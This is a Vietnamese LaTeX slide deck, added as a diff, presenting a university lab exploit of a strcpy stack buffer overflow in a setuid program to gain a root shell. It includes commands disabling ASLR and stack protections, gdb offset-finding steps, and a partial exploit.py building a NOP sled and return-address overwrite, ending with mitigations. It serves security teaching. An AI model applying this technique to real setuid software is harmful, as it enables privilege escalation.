@@ -1,0 +1,382 @@
+% =============================================================================
+%  Slide báo cáo - Bài lab Tràn bộ đệm (Buffer Overflow)
+%  Môn: Nhập môn An toàn máy tính - Trường Đại học Khoa học Tự nhiên (HUS)
+%
+%  BIÊN DỊCH: dùng pdfLaTeX (mặc định trên Overleaf free). Phông Latin Modern
+%  + T5 fontenc + babel vietnamese -> nhẹ, gõ được tiếng Việt, không cần XeLaTeX.
+%
+%  Overleaf: Menu -> Compiler -> pdfLaTeX (mặc định đã đúng).
+% =============================================================================
+\documentclass[aspectratio=169,10pt]{beamer}
+
+% ---- Phông & tiếng Việt (nhẹ, chạy pdfLaTeX) ----
+\usepackage[utf8]{inputenc}
+\usepackage[T5]{fontenc}
+\usepackage{lmodern}
+\usepackage[vietnamese]{babel}
+
+% ---- Giao diện đơn giản, sáng ----
+\usetheme{Madrid}
+\usecolortheme{seahorse}
+\usefonttheme{structurebold}
+\setbeamertemplate{navigation symbols}{}   % bỏ các nút điều hướng
+\setbeamertemplate{caption}[numbered]
+
+% ---- Gói hỗ trợ ----
+\usepackage{tikz}
+\usetikzlibrary{arrows.meta, positioning, shapes.geometric, calc}
+\usepackage{listings}
+\usepackage{xcolor}
+\usepackage{booktabs}
+
+% ---- Định dạng khối mã ----
+\definecolor{codebg}{RGB}{245,245,245}
+\lstset{
+  basicstyle=\ttfamily\scriptsize,
+  backgroundcolor=\color{codebg},
+  breaklines=true,
+  frame=single,
+  keywordstyle=\color{blue!60!black}\bfseries,
+  commentstyle=\color{green!45!black}\itshape,
+  stringstyle=\color{red!60!black},
+  numbers=none,
+  showstringspaces=false,
+  columns=fullflexible
+}
+
+% ---- Khung placeholder cho ảnh chụp màn hình ----
+% Thay \screenshot{...} bằng \includegraphics khi đã có ảnh thật.
+\newcommand{\screenshot}[2]{%
+  \begin{tikzpicture}
+    \draw[dashed, thick, gray] (0,0) rectangle (#1,#2);
+    \node[align=center, gray, font=\small] at (#1/2, #2/2)
+      {\textit{[Chèn ảnh chụp màn hình tại đây]}};
+  \end{tikzpicture}%
+}
+
+% ---- Thông tin đầu đề ----
+\title[Tràn bộ đệm]{Khai thác lỗ hổng Tràn bộ đệm \\ để đạt Root Shell}
+\subtitle{Nhập môn An toàn máy tính}
+\author[Nhóm 3]{Lê Văn Cường (23001842) \and Nguyễn Việt Anh (23001829) \and Nguyễn Mai Hoàng Anh (23001824)}
+\institute[HUS]{Trường Đại học Khoa học Tự nhiên}
+\date{\today}
+
+\begin{document}
+
+% ===================== SLIDE 1: TRANG BÌA =====================
+\begin{frame}[plain]
+  \titlepage
+\end{frame}
+
+% ===================== SLIDE 2: NỘI DUNG =====================
+\begin{frame}{Nội dung trình bày}
+  \tableofcontents
+\end{frame}
+
+% ===================== SLIDE 3: PHÂN CÔNG =====================
+\section{Phân công công việc}
+\begin{frame}{Phân công công việc nhóm}
+  \small
+  \begin{table}
+    \begin{tabular}{p{3.2cm} p{3cm} p{5.2cm}}
+      \toprule
+      \textbf{Thành viên} & \textbf{MSV} & \textbf{Nhiệm vụ chính} \\
+      \midrule
+      Lê Văn Cường & 23001842 &
+        Phụ trách \texttt{stack.c}, thiết lập môi trường (biên dịch, setuid,
+        tắt ASLR); debug \texttt{gdb} xác định offset. \\
+      \addlinespace
+      Nguyễn Việt Anh & 23001829 &
+        Phụ trách \texttt{exploit.py}, tính địa chỉ return address, dựng badfile,
+        quay video và lồng tiếng. \\
+      \addlinespace
+      Nguyễn Mai Hoàng Anh & 23001824 &
+        Soạn slide \& tài liệu, vẽ sơ đồ, tổng hợp ảnh chụp màn hình,
+        viết phần khai báo sử dụng AI. \\
+      \bottomrule
+    \end{tabular}
+  \end{table}
+  \footnotesize\textit{Cả ba thành viên cùng rà soát kết quả cuối và chịu trách nhiệm chung về nội dung.}
+\end{frame}
+
+% ===================== SLIDE 4: BÀI TOÁN =====================
+\section{Bài toán \& ý tưởng}
+\begin{frame}{Đề bài và điểm khác biệt}
+  \begin{itemize}
+    \item Chương trình \texttt{stack.c} có lỗ hổng tràn bộ đệm (dùng \texttt{strcpy}).
+    \item \textbf{Khác với bài giảng:}
+      \begin{itemize}
+        \item Kích thước (và địa chỉ) bộ đệm \texttt{buffer} \alert{không cố định},
+              nằm trong khoảng cho trước $[100, 300]$ byte.
+        \item Chương trình nhận \textbf{Mã sinh viên (MSV)} làm tham số dòng lệnh
+              và dùng MSV làm \alert{mầm gieo ngẫu nhiên}:
+              \texttt{\$ ./stack <MSV>}
+      \end{itemize}
+    \item \textbf{Mục tiêu:} biên dịch \texttt{stack.c} thành chương trình có
+          đặc quyền root (setuid) và khai thác lỗ hổng để đạt \alert{root shell}.
+  \end{itemize}
+  \vfill
+  \begin{block}{Hệ quả của việc gieo mầm theo MSV}
+    Mỗi nhóm có kích thước buffer riêng $\Rightarrow$ offset tới return address
+    khác nhau $\Rightarrow$ lời giải (badfile) của mỗi nhóm là duy nhất.
+  \end{block}
+\end{frame}
+
+% ===================== SLIDE 5: KIẾN THỨC NỀN =====================
+\section{Kiến thức nền tảng}
+\begin{frame}{Bố cục bộ nhớ tiến trình \& khung ngăn xếp (stack frame)}
+  \begin{columns}
+    \begin{column}{0.46\textwidth}
+      \footnotesize
+      Khi gọi hàm \texttt{bof()}, ngăn xếp (stack) chứa:
+      \begin{itemize}
+        \item \texttt{buffer[]} (địa chỉ thấp)
+        \item Saved \texttt{ebp} (frame pointer cũ)
+        \item \textbf{Return address} (địa chỉ quay về)
+        \item Tham số của hàm
+      \end{itemize}
+      \texttt{strcpy} ghi từ \texttt{buffer} đi lên vùng địa chỉ cao
+      $\Rightarrow$ có thể \alert{đè lên return address}.
+    \end{column}
+    \begin{column}{0.52\textwidth}
+      \centering
+      \begin{tikzpicture}[font=\scriptsize, node distance=0pt]
+        \node[draw, minimum width=3.6cm, minimum height=0.7cm, fill=blue!10] (buf) {buffer[\,] (VLA)};
+        \node[draw, minimum width=3.6cm, minimum height=0.6cm, fill=blue!10, below=0pt of buf] (gap) {\ldots (đệm) \ldots};
+        \node[draw, minimum width=3.6cm, minimum height=0.6cm, fill=orange!25, below=0pt of gap] (ebp) {saved ebp};
+        \node[draw, minimum width=3.6cm, minimum height=0.7cm, fill=red!30, below=0pt of ebp] (ret) {\textbf{return address}};
+        \node[draw, minimum width=3.6cm, minimum height=0.6cm, fill=gray!15, below=0pt of ret] (arg) {tham số};
+        \draw[-{Stealth}, thick, green!50!black] ($(buf.west)+(-0.5,0)$) -- ($(arg.west)+(-0.5,0)$)
+          node[midway, left, align=center, rotate=90, anchor=south] {chiều ghi của strcpy};
+        \node[left=0.1cm of buf, gray] {đ/c thấp};
+        \node[left=0.1cm of arg, gray] {đ/c cao};
+      \end{tikzpicture}
+    \end{column}
+  \end{columns}
+\end{frame}
+
+% ===================== SLIDE 6: LỖ HỔNG =====================
+\begin{frame}[fragile]{Lỗ hổng trong \texttt{stack.c}}
+\begin{lstlisting}[language=C]
+int bof(char *str, int bufsize)
+{
+    char buffer[bufsize];   // kich thuoc & dia chi thay doi theo MSV
+    strcpy(buffer, str);    // <-- LO HONG: khong kiem tra do dai
+    return 1;
+}
+\end{lstlisting}
+  \begin{itemize}
+    \item \texttt{str} dài 517 byte, \texttt{buffer} chỉ 100--300 byte
+          $\Rightarrow$ \texttt{strcpy} ghi tràn.
+    \item Nếu dữ liệu tràn chứa địa chỉ do ta chọn tại đúng ô return address,
+          CPU sẽ nhảy tới nơi ta muốn khi hàm kết thúc.
+  \end{itemize}
+\end{frame}
+
+% ===================== SLIDE 7: Ý TƯỞNG TẤN CÔNG =====================
+\begin{frame}{Cấu trúc badfile: NOP sled + shellcode + địa chỉ đè}
+  \centering
+  \begin{tikzpicture}[font=\scriptsize]
+    \draw[fill=green!15] (0,0) rectangle (4,1);   \node at (2,0.5) {NOP sled (0x90 \ldots)};
+    \draw[fill=red!25]   (4,0) rectangle (6,1);   \node (r) at (5,0.5) {\textbf{ret} (đè)};
+    \draw[fill=green!15] (6,0) rectangle (9,1);   \node (n) at (7.5,0.5) {NOP \ldots};
+    \draw[fill=blue!20]  (9,0) rectangle (12,1);  \node at (10.5,0.5) {shellcode};
+    \draw[-{Stealth}, thick] (5,-0.3) .. controls (6,-1.0) and (9,-1.0) .. (7.5,-0.05);
+    \node[align=center] at (6.5,-1.2) {\footnotesize \texttt{ret} trỏ vào vùng NOP $\Rightarrow$ trượt tới shellcode};
+  \end{tikzpicture}
+  \vspace{0.6cm}
+  \begin{itemize}\footnotesize
+    \item \textbf{NOP sled}: dãy lệnh \texttt{0x90} (không làm gì) tạo "vùng hạ cánh" rộng.
+    \item \textbf{ret}: ghi đè return address, trỏ vào giữa NOP sled.
+    \item \textbf{shellcode}: \texttt{setuid(0)} + \texttt{execve("/bin/sh")} $\Rightarrow$ root shell.
+  \end{itemize}
+\end{frame}
+
+% ===================== SLIDE 8: MÔI TRƯỜNG =====================
+\section{Thực hiện}
+\begin{frame}[fragile]{Môi trường \& biên dịch (SEED Ubuntu 32-bit)}
+\begin{lstlisting}[language=bash]
+# Tat ASLR de dia chi stack on dinh
+sudo sysctl -w kernel.randomize_va_space=0
+
+# Bien dich: 32-bit, tat bao ve stack, cho phep thuc thi tren stack
+gcc -m32 -g -O0 -fno-stack-protector -z execstack -o stack stack.c
+
+# Gan quyen root (setuid)
+sudo chown root stack
+sudo chmod 4755 stack
+\end{lstlisting}
+  \footnotesize
+  \begin{itemize}
+    \item \texttt{-fno-stack-protector}: tắt "canary" bảo vệ stack.
+    \item \texttt{-z execstack}: cho phép thực thi mã trên vùng stack.
+    \item \texttt{chmod 4755}: bật bit setuid $\Rightarrow$ chạy với quyền root.
+  \end{itemize}
+\end{frame}
+
+% ===================== SLIDE 9: BƯỚC 1 - NƠI RETURN ADDRESS =====================
+\begin{frame}[fragile]{Bước 1 --- Xác định \emph{nơi} đặt return address}
+  \begin{columns}
+    \begin{column}{0.5\textwidth}
+      \footnotesize
+      Dùng \texttt{gdb} đặt breakpoint tại \texttt{bof}:
+\begin{lstlisting}[language=bash]
+gdb -q stack
+b bof
+run 23001842
+p $ebp
+p &buffer
+\end{lstlisting}
+      Công thức tính offset:
+      \[
+        \text{offset} = (\$ebp + 4) - \&buffer
+      \]
+      Ô return address nằm ngay trên saved \texttt{ebp}, tức tại \texttt{\$ebp + 4}.
+    \end{column}
+    \begin{column}{0.5\textwidth}
+      \centering
+      \screenshot{5}{3.5}
+      \\[0.2cm]
+      \footnotesize\textit{Ảnh: gdb in ra \$ebp và \&buffer}
+    \end{column}
+  \end{columns}
+\end{frame}
+
+% ===================== SLIDE 10: BƯỚC 2 - GIÁ TRỊ RETURN ADDRESS =====================
+\begin{frame}{Bước 2 --- Xác định \emph{giá trị} của return address}
+  \begin{columns}
+    \begin{column}{0.5\textwidth}
+      \footnotesize
+      \begin{itemize}
+        \item Lấy địa chỉ \texttt{buffer} từ gdb (ví dụ \texttt{0xffffcedc}).
+        \item Chọn \texttt{ret} trỏ vào \textbf{giữa} vùng NOP sled để chắc chắn
+              "hạ cánh" an toàn:
+      \end{itemize}
+      \[
+        \text{ret} = \&buffer + \delta
+      \]
+      với $\delta$ là khoảng dư (vd $0x64 = 100$).
+      \begin{block}{Lưu ý}
+        Vì đã tắt ASLR, địa chỉ stack khi chạy trùng với khi debug trong gdb.
+      \end{block}
+    \end{column}
+    \begin{column}{0.5\textwidth}
+      \centering
+      \screenshot{5}{3.5}
+      \\[0.2cm]
+      \footnotesize\textit{Ảnh: gdb in \&buffer và tính toán ret}
+    \end{column}
+  \end{columns}
+\end{frame}
+
+% ===================== SLIDE 11: CHỈNH EXPLOIT.PY =====================
+\begin{frame}[fragile]{Bước 3 --- Chỉnh \texttt{exploit.py} tạo badfile}
+\begin{lstlisting}[language=Python]
+# Hai tham so can chinh theo gia tri doc tu gdb:
+offset = 0x8c          # = ($ebp+4) - &buffer
+ret    = 0xffffcf40    # = &buffer + do du (tro vao NOP sled)
+
+content = bytearray(0x90 for _ in range(517))   # NOP sled
+start = 517 - len(shellcode)
+content[start:] = shellcode                      # shellcode o cuoi
+content[offset:offset+4] = ret.to_bytes(4, 'little')  # ghi de return addr
+\end{lstlisting}
+  \footnotesize
+  Chạy \texttt{python3 exploit.py} $\Rightarrow$ sinh ra \texttt{badfile} (517 byte).
+  \alert{Giá trị offset/ret ở trên chỉ là ví dụ; nhóm thay bằng số đọc từ gdb.}
+\end{frame}
+
+% ===================== SLIDE 12: TẤN CÔNG =====================
+\begin{frame}[fragile]{Bước 4 --- Thực hiện tấn công}
+  \begin{columns}
+    \begin{column}{0.5\textwidth}
+\begin{lstlisting}[language=bash]
+$ python3 exploit.py
+$ ./stack 23001842
+MSV (seed)        : 23001842
+Kich thuoc buffer : 237 byte
+# id
+uid=0(root) gid=1000 ...
+\end{lstlisting}
+      \footnotesize
+      Dấu nhắc đổi thành \texttt{\#} và lệnh \texttt{id} cho \alert{uid=0(root)}
+      $\Rightarrow$ tấn công thành công, dòng "Returned Properly" không xuất hiện.
+    \end{column}
+    \begin{column}{0.5\textwidth}
+      \centering
+      \screenshot{5}{3.5}
+      \\[0.2cm]
+      \footnotesize\textit{Ảnh: shell root thu được}
+    \end{column}
+  \end{columns}
+\end{frame}
+
+% ===================== SLIDE 13: SƠ ĐỒ QUY TRÌNH =====================
+\begin{frame}{Sơ đồ tổng quát quy trình tấn công}
+  \centering
+  \begin{tikzpicture}[font=\footnotesize, node distance=0.6cm and 0.9cm,
+    box/.style={draw, rounded corners, fill=blue!10, minimum width=2.4cm,
+                minimum height=0.9cm, align=center}]
+    \node[box] (a) {Biên dịch + setuid\\ \texttt{stack.c}};
+    \node[box, right=of a] (b) {gdb: tìm\\ \&buffer, \$ebp};
+    \node[box, right=of b] (c) {Tính offset\\ \& ret};
+    \node[box, below=of c] (d) {Sửa \texttt{exploit.py}\\ tạo badfile};
+    \node[box, left=of d] (e) {Chạy\\ \texttt{./stack <MSV>}};
+    \node[box, left=of e, fill=red!25] (f) {\textbf{Root shell}\\ \texttt{uid=0}};
+    \draw[-{Stealth}] (a)--(b);
+    \draw[-{Stealth}] (b)--(c);
+    \draw[-{Stealth}] (c)--(d);
+    \draw[-{Stealth}] (d)--(e);
+    \draw[-{Stealth}] (e)--(f);
+  \end{tikzpicture}
+\end{frame}
+
+% ===================== SLIDE 14: SỬ DỤNG AI =====================
+\section{Khai báo \& Kết luận}
+\begin{frame}{Khai báo mức độ sử dụng AI}
+  \footnotesize
+  \begin{table}
+    \begin{tabular}{p{1.3cm} p{5.3cm} p{4.6cm}}
+      \toprule
+      \textbf{Mức} & \textbf{Nội dung áp dụng} & \textbf{Vai trò của AI / sinh viên} \\
+      \midrule
+      Mức 1 & Tranh luận, phản biện về cách tính offset và chọn ret &
+        AI gợi ý hướng; \textbf{sinh viên tự triển khai} gdb \& tính toán. \\
+      \addlinespace
+      Mức 2 & Soạn khung \texttt{stack.c}, \texttt{exploit.py}, bố cục slide &
+        AI đồng sáng tạo theo thiết kế của SV; \textbf{SV biên tập, chỉnh sửa, chịu trách nhiệm}. \\
+      \addlinespace
+      Mức 3 & Sinh nội dung tài liệu giải thích, kịch bản thuyết trình &
+        SV viết prompt \& ghép nối; \textbf{SV kiểm chứng toàn bộ số liệu gdb}. \\
+      \bottomrule
+    \end{tabular}
+  \end{table}
+  \textit{Mọi địa chỉ, offset và kết quả tấn công trong video đều do nhóm tự thực hiện và kiểm chứng trên máy của nhóm.}
+\end{frame}
+
+% ===================== SLIDE 15: KẾT LUẬN =====================
+\begin{frame}{Kết luận \& biện pháp phòng chống}
+  \begin{itemize}
+    \item Đã khai thác thành công lỗ hổng tràn bộ đệm trên \texttt{stack.c}
+          (buffer ngẫu nhiên theo MSV) để đạt root shell.
+    \item \textbf{Phòng chống:}
+      \begin{itemize}
+        \item Dùng hàm an toàn (\texttt{strncpy}, \texttt{snprintf}), kiểm tra độ dài.
+        \item Bật Stack Canary (\texttt{-fstack-protector}).
+        \item Bật ASLR và \texttt{NX} (non-executable stack).
+        \item Hạn chế tối đa chương trình setuid-root.
+      \end{itemize}
+  \end{itemize}
+\end{frame}
+
+% ===================== SLIDE 16: CẢM ƠN =====================
+\begin{frame}[plain]
+  \centering
+  \vfill
+  {\Huge \textbf{Cảm ơn thầy/cô \\ và các bạn đã lắng nghe!}}
+  \vfill
+  \footnotesize Nhóm 3 --- Nhập môn An toàn máy tính --- HUS
+  \vfill
+\end{frame}
+
+\end{document}
